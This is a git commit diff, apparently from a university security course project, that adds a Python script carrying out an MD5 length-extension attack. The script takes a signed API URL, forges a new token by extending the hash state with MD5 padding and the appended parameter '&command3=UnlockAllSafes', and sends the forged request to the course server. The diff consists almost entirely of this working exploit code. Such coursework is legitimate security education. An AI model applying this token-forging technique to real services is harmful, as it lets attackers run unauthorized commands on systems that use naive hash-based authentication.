882238e528bd6c23980507090753a998da89a3d1
sasha97 <sasha97@vt.edu>
2018-09-10 21:40:56 -0400

    Length Ext Attack Code

--- Project1/len_ext_attack.py
+++ Project1/len_ext_attack.py
@@ -1,32 +1,39 @@
 import httplib, urlparse, sys
+import urllib
 from pymd5 import md5, padding
-from urlparse import urlparse
 
-url = "http://courses.cs.vt.edu/cs4264/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp"
-toAdd = "&command3=UnlockAllSafes"
-parsed = urlparse(url)
-query = parsed.query
-queryL = query.split('&')
-temp = []
-name = []
-item = []
-for i in queryL:
-    temp = i.split('=')
-    name.append(temp[0])
-    item.append(temp[1])
-
-rettoken = md5(state=item[0].decode("hex"), count=512)
-rettoken.update(toAdd)
-token = rettoken.hexdigest()
-'''
-end = name[0] + "=" + token + "&" + name[1] + "=" + item[1] + "&" + name[2] + "=" + item[2] + "&" + name[3] + "=" + item[3] + toAdd
-nurl = '"' + parsed.scheme + "://" + parsed.netloc + parsed.path + end + toAdd + '"'
-url = nurl
-print url
-'''
+url = sys.argv[1]
 # Your code to modify url goes here
 
+##########################################################################
+
+tokenStart = url.find("=")
+tokenStop = url.find("&")
+
+urlPt1 = url[ : tokenStart + 1]
+origToken = url[tokenStart + 1 : tokenStop]
+origMsg = url[tokenStop : ]
+
+toAdd = "&command3=UnlockAllSafes"
+
+origLen = len(origMsg) - 1 + 8
+origPad = padding(origLen*8)
+
+h = md5(state=origToken.decode("hex"), count=512)
+h.update(toAdd)
+newToken = h.hexdigest()
+
+modURL = urlPt1 + str(newToken) + origMsg
+
+readablePad = urllib.quote(origPad)
+
+url = modURL + str(readablePad) + toAdd
+
+print("New URL: " + url)
+
+##########################################################################
+
 parsedUrl = urlparse.urlparse(url)
-conn = httplib.HTTPSConnection(parsedUrl.hostname, parsedUrl.port)
+conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
 print conn.getresponse().read()
